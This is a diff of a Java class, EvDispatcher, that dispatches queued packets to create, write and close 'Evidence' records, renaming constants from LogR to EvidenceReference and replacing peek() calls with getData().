@@ -105,27 +105,27 @@ public class EvDispatcher extends Thread implements Runnable {
 			return;
 		}
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (processQueue): " + p.getCommand());
+			Check.log(TAG + " (processQueue) command: " + p.getCommand());
 		}
 		switch (p.getCommand()) {
 
-		case LogR.LOG_CREATE:
+		case EvidenceReference.LOG_CREATE:
 			createEv(p);
 			break;
 
-		case LogR.LOG_ATOMIC:
+		case EvidenceReference.LOG_ATOMIC:
 			atomicEv(p);
 			break;
 
-		case LogR.LOG_WRITE:
+		case EvidenceReference.LOG_WRITE:
 			writeEv(p);
 			break;
 			
-		case LogR.LOG_ITEMS:
+		case EvidenceReference.LOG_ITEMS:
 			itemsEv(p);
 			break;
 
-		case LogR.LOG_CLOSE:
+		case EvidenceReference.LOG_CLOSE:
 			closeEv(p);
 			break;
 
@@ -293,7 +293,7 @@ public class EvDispatcher extends Thread implements Runnable {
 		}
 
 		final byte[] additional = p.getAdditional();
-		final byte[] data = p.peek();
+		final byte[] data = p.getData();
 		
 		final Evidence evidence = new Evidence(p.getType());
 
@@ -308,12 +308,10 @@ public class EvDispatcher extends Thread implements Runnable {
 		}
 
 		//final byte[] additional = p.getAdditional();
-		final byte[] data = p.peek();
-		
+		final byte[] data = p.getData();		
 		final Evidence evidence = new Evidence(p.getType());
 
 		evidence.atomicWriteOnce(p.getItems());
-
 	}
 
 	/**
@@ -333,7 +331,7 @@ public class EvDispatcher extends Thread implements Runnable {
 		}
 
 		final Evidence evidence = evidences.get(p.getId());
-		final boolean ret = evidence.writeEvidence(p.peek());
+		final boolean ret = evidence.writeEvidence(p.getData());
 
 		return ret;
 	}
